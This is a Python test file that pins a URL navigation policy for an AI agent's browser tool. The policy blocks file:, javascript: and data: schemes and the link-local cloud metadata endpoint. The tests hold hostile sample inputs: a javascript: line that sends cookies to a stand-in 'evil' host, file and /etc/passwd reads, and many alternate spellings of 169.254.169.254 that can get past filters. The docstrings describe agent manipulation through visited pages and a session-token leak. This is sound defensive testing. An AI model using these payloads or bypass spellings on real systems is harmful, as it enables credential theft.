"""What the shared page will and will not navigate to.

The page is driven by the agent's tools as well as by a reader, and the agent's
instructions can come from a page it already visited, so a navigation target is
untrusted input on both paths. These pin the refusals; the driver calls
``check_navigation`` before it ensures a page, so a refused target never even
launches Chromium.
"""

from __future__ import annotations

from types import SimpleNamespace

import pytest

from raven.browser.policy import BLANK, NavigationRefusedError, check_navigation


class TestRefused:
    def test_a_file_url_cannot_be_opened(self) -> None:
        """The finding this module exists for.

        ``browser.open("file:///Users/<me>/.raven/serve.json")`` followed by
        ``browser.read`` returned the gateway's session token as page text. The
        split that keeps that token out of a client's reach does not survive a
        browser that can read the disk.
        """
        with pytest.raises(NavigationRefusedError, match="file:"):
            check_navigation("file:///Users/admin/.raven/serve.json")

    @pytest.mark.parametrize(
        "url",
        [
            "chrome://settings",
            "devtools://devtools/bundled/inspector.html",
            "view-source:https://example.com",
            "data:text/html,<script>fetch('/etc/passwd')</script>",
            "javascript:fetch('http://evil/'+document.cookie)",
            "blob:https://example.com/1234",
        ],
    )
    def test_every_other_scheme_is_refused(self, url: str) -> None:
        with pytest.raises(NavigationRefusedError):
            check_navigation(url)

    def test_a_scheme_is_matched_without_slashes(self) -> None:
        """`data:` and `javascript:` carry no `//`.

        An earlier draft completed anything without `://` to https, which turned
        `data:text/html,...` into an https request to a host named after its
        payload -- harmless, and a confusing way to be harmless.
        """
        with pytest.raises(NavigationRefusedError):
            check_navigation("data:text/plain,hello")

    def test_the_scheme_check_is_case_insensitive(self) -> None:
        with pytest.raises(NavigationRefusedError):
            check_navigation("FILE:///etc/passwd")

    @pytest.mark.parametrize("host", ["169.254.169.254", "169.254.0.1", "[fe80::1]"])
    def test_link_local_is_refused(self, host: str) -> None:
        """169.254.169.254 answers instance credentials to any plain GET from the
        machine, on every major cloud."""
        with pytest.raises(NavigationRefusedError, match="link-local"):
            check_navigation(f"http://{host}/latest/meta-data/")


class TestAllowed:
    def test_a_bare_host_is_completed_to_https(self) -> None:
        assert check_navigation("example.com") == "https://example.com"

    def test_whitespace_is_trimmed(self) -> None:
        assert check_navigation("  https://example.dev/x  ") == "https://example.dev/x"

    def test_blank_is_the_empty_page(self) -> None:
        assert check_navigation(BLANK) == BLANK

    @pytest.mark.parametrize("url", ["http://localhost:3000", "http://127.0.0.1:8080/x", "http://192.168.1.10"])
    def test_loopback_and_private_hosts_stay_open(self, url: str) -> None:
        """Deliberately not refused with link-local.

        A reader pointing the page at their own dev server is the ordinary case
        for this feature, and closing it would trade a real capability for no
        gain -- the credential endpoint that motivates the refusal is link-local,
        not loopback.
        """
        assert check_navigation(url) == url

    def test_an_empty_url_is_refused_rather_than_completed(self) -> None:
        with pytest.raises(NavigationRefusedError):
            check_navigation("   ")


async def test_the_driver_refuses_before_it_launches_anything(monkeypatch: pytest.MonkeyPatch) -> None:
    """The check runs before ``_ensure``.

    Ordering is the point: a refused target that still started Chromium would
    leave a browser running for a navigation that never happened, and on a host
    without playwright it would raise BrowserUnavailableError instead of saying
    why the URL was refused.
    """
    from raven.browser.driver import Browser

    browser = Browser()

    async def _boom() -> None:
        raise AssertionError("_ensure must not be reached for a refused target")

    monkeypatch.setattr(browser, "_ensure", _boom)

    state = await browser.goto("file:///etc/passwd")

    assert "file:" in state["error"]
    assert state["started"] is False


async def test_a_new_tab_is_refused_past_the_cap(monkeypatch: pytest.MonkeyPatch) -> None:
    """The agent opens tabs through the same call the panel's Cmd-T uses.

    A loop that opens one per iteration costs a renderer process each, and the
    machine goes down before anything in raven notices.
    """
    from raven.browser.driver import MAX_TABS, Browser

    browser = Browser()

    async def _ensure() -> None:
        return None

    monkeypatch.setattr(browser, "_ensure", _ensure)
    monkeypatch.setattr(browser, "_pages", lambda: [object()] * MAX_TABS)

    state = await browser.tab_new("https://example.com")

    assert "tab limit" in state["error"]


async def test_the_rpc_stack_teardown_closes_the_browser(monkeypatch: pytest.MonkeyPatch) -> None:
    """Chromium is a child process too, and a persistent-profile one.

    Leaving it running holds the profile lock the next launch needs, so the next
    `raven serve` silently falls back to a throwaway profile and the reader's
    logins are gone.
    """
    import raven.browser as browser_module
    import raven.rpc.bootstrap as bootstrap

    closed: list[bool] = []

    class _Fake:
        async def close(self) -> None:
            closed.append(True)

    monkeypatch.setattr(browser_module, "get_browser", lambda: _Fake())

    async def _sink(_frame: dict) -> None:
        return None

    stack = await bootstrap.build_rpc_stack(_sink)
    import asyncio

    await asyncio.wait_for(stack.teardown(), timeout=30)

    assert closed == [True], "the browser is still running after teardown"


class TestTheAddressIsRecognisedTheWayChromiumSpellsIt:
    """`ipaddress` takes dotted-quad; Chromium implements the WHATWG parser.

    So the refusal used to recognise one spelling of the metadata endpoint out
    of several that reach it, and checking python's answer while Chromium acts
    on its own is how a refused address stays reachable.
    """

    @pytest.mark.parametrize(
        "url",
        [
            "http://169.254.169.254/latest/meta-data/",
            "http://2852039166/latest/meta-data/",  # decimal
            "http://0xA9FEA9FE/latest/meta-data/",  # hex
            "http://0251.0376.0251.0376/latest/meta-data/",  # dotted octal
            "http://169.254.43518/latest/meta-data/",  # three parts, last fills two bytes
            "http://[::ffff:169.254.169.254]/latest/meta-data/",  # v4 wearing a v6 spelling
            "http://169.254.169.254./latest/meta-data/",  # trailing dot, same host
        ],
    )
    def test_every_spelling_of_the_metadata_endpoint_is_refused(self, url: str) -> None:
        with pytest.raises(NavigationRefusedError, match="link-local"):
            check_navigation(url)

    @pytest.mark.parametrize(
        "url",
        [
            # Chromium maps the host before parsing it; this used to read the
            # raw string, so a spelling it could not split went through as a
            # domain while the browser landed on the address.
            "http://169．254．169．254/latest/meta-data/",  # fullwidth stops
            "http://169.254.169.²⁵⁴/latest/meta-data/",  # superscript digits
            "http://169.254.169.254/latest/meta-data/",
        ],
    )
    def test_a_unicode_spelling_of_the_address_is_refused(self, url: str) -> None:
        with pytest.raises(NavigationRefusedError, match="link-local"):
            check_navigation(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://example.com",
            "https://example.com.",
            "http://localhost:3000",
            "https://127.0.0.1:8080",  # a dev server is the ordinary case
            "https://192.168.1.10",
            "https://0install.example",  # a name that begins with a digit
            "http://2852039166.example.com",  # a numeric label inside a name
        ],
    )
    def test_an_ordinary_host_still_opens(self, url: str) -> None:
        assert check_navigation(url)

    @pytest.mark.parametrize(
        "url",
        [
            "http://\u0661\u0666\u0669.\u0662\u0665\u0664.\u0661\u0666\u0669.\u0662\u0665\u0664/",  # Arabic-Indic
            "http://\u0967\u0966.\u0966.\u0966.\u0967/",  # Devanagari
        ],
    )
    def test_a_unicode_numeral_host_is_a_name_not_an_address(self, url: str) -> None:
        """UTS-46 leaves these digits alone, because they are valid IDNA -- so
        Chromium reads an ordinary domain. Python's `int` and `isalnum` read
        every Unicode digit range, where WHATWG's IPv4 parser is ASCII-only, so
        this parsed one as 169.254.169.254 and refused a legitimate name for
        living somewhere it does not."""
        assert check_navigation(url)

    def test_a_name_that_resolves_link_local_is_not_covered(self) -> None:
        """Stated as a test because the docstring says it: this is the limit of
        a URL-string check, not an oversight. Closing it means checking where
        the address is known -- after resolution -- not here."""
        assert check_navigation("http://metadata.google.internal/computeMetadata/v1/")


async def _slow_close() -> None:
    """A context close that actually yields, so a relaunch can be raced."""
    import asyncio

    await asyncio.sleep(0.01)


class TestTheInterceptor:
    """The URL-string check is the only one a *caller* can reach.

    Every other way the page moves -- a click following an href the driver never
    sees, a popup that becomes the active tab, a redirect that arrives after the
    pre-check -- went through unchecked, and on a cloud host that is the whole
    link-local refusal: the page the agent is reading is what tells it where to
    go next.
    """

    class _Route:
        def __init__(self, url: str, *, navigation: bool = True) -> None:
            self.request = SimpleNamespace(url=url, is_navigation_request=lambda: navigation)
            self.continued = False
            self.aborted: str | None = None

        async def continue_(self) -> None:
            self.continued = True

        async def abort(self, reason: str) -> None:
            self.aborted = reason

    async def test_a_navigation_to_link_local_is_aborted(self) -> None:
        from raven.browser.driver import Browser

        route = self._Route("http://169.254.169.254/latest/meta-data/iam/security-credentials/role")
        await Browser()._police(route)

        assert route.aborted == "blockedbyclient"
        assert route.continued is False

    async def test_the_refusal_is_reported_to_the_next_state(self) -> None:
        """A click that goes nowhere with nothing said reads as a dead link."""
        from raven.browser.driver import Browser

        b = Browser()
        await b._police(self._Route("http://169.254.169.254/latest/meta-data/"))
        first = await b._state()
        assert "link-local" in (first.get("error") or "")
        # Once, then forgotten: it describes one navigation, not a condition.
        assert (await b._state()).get("error") is None

    async def test_an_ordinary_navigation_passes(self) -> None:
        from raven.browser.driver import Browser

        route = self._Route("https://example.com/docs")
        await Browser()._police(route)
        assert route.continued is True and route.aborted is None

    async def test_a_route_that_cannot_be_read_fails_open(self) -> None:
        """A request neither continued nor aborted hangs until the navigation
        times out, saying nothing. This check is the second line of defence --
        `goto` refuses first -- so failing open is the better default."""
        from raven.browser.driver import Browser

        class _Broken:
            def __init__(self) -> None:
                self.request = SimpleNamespace(
                    url="https://example.com",
                    is_navigation_request=lambda: (_ for _ in ()).throw(RuntimeError("torn down")),
                )
                self.continued = False

            async def continue_(self) -> None:
                self.continued = True

        route = _Broken()
        await Browser()._police(route)
        assert route.continued is True

    async def test_a_subresource_is_not_policed(self) -> None:
        """An image cannot put its bytes where `browser.read` would return them,
        and a round trip per request would cost every page load."""
        from raven.browser.driver import Browser

        route = self._Route("http://169.254.169.254/favicon.ico", navigation=False)
        await Browser()._police(route)
        assert route.continued is True and route.aborted is None


async def test_two_concurrent_callers_do_not_launch_at_the_same_time(monkeypatch: pytest.MonkeyPatch) -> None:
    """The gateway dispatches frames concurrently.

    So two requests that both found no page each ran the launch: two Chromiums,
    the first's handles overwritten and unclosable, and the survivor the one
    that lost the profile lock -- i.e. the one without the reader's logins.

    Driven through the *real* `_launch_once` on its relaunch branch, because
    that branch calls `close()`, and a lock that lives on the state `close()`
    replaces stops excluding anyone at the exact moment a relaunch is in
    flight. A test that stubs `_launch_once` cannot see that: it proves
    `_ensure` serialises calls to something, not that the something keeps the
    same lock.
    """
    import asyncio

    from raven.browser import driver as driver_mod
    from raven.browser.driver import Browser

    b = Browser()
    monkeypatch.setattr(b, "probe", lambda: (True, ""))
    # A dead page, so `_launch_once` takes the relaunch branch and calls close().
    b._s.page = SimpleNamespace(is_closed=lambda: True)
    b._s.context = SimpleNamespace(close=_slow_close)

    inside = 0
    overlapped = False

    class _FakePlaywright:
        async def start(self) -> object:
            nonlocal inside, overlapped
            inside += 1
            overlapped = overlapped or inside > 1
            # The suspension point a real launch has in abundance.
            await asyncio.sleep(0.05)
            inside -= 1
            raise RuntimeError("stop here: the lock is what this test is about")

    monkeypatch.setattr(
        driver_mod,
        "async_playwright",
        lambda: _FakePlaywright(),
        raising=False,
    )
    monkeypatch.setitem(
        __import__("sys").modules,
        "playwright.async_api",
        SimpleNamespace(async_playwright=lambda: _FakePlaywright()),
    )

    # Started apart, not together: two callers that arrive at the same instant
    # both read the *same* lock object before close() swaps it, so they are
    # excluded either way. The bug needs the second one to arrive after the
    # swap -- which is the ordinary case, since the first is by then waiting on
    # the browser to start.
    first = asyncio.create_task(b._ensure())
    await asyncio.sleep(0.03)
    second = asyncio.create_task(b._ensure())
    await asyncio.gather(first, second, return_exceptions=True)

    assert overlapped is False, "a caller arriving after close() got a fresh lock and walked in"


async def test_a_live_page_is_handed_back_without_relaunching(monkeypatch: pytest.MonkeyPatch) -> None:
    """The re-check the lock exists to make meaningful.

    It lives in `_launch_once`, so the second caller of a pair reaches it only
    after the first has finished and set the page.
    """
    from raven.browser.driver import Browser

    b = Browser()
    monkeypatch.setattr(b, "probe", lambda: (True, ""))
    b._s.page = SimpleNamespace(is_closed=lambda: False)

    assert await b._ensure() is b._s.page
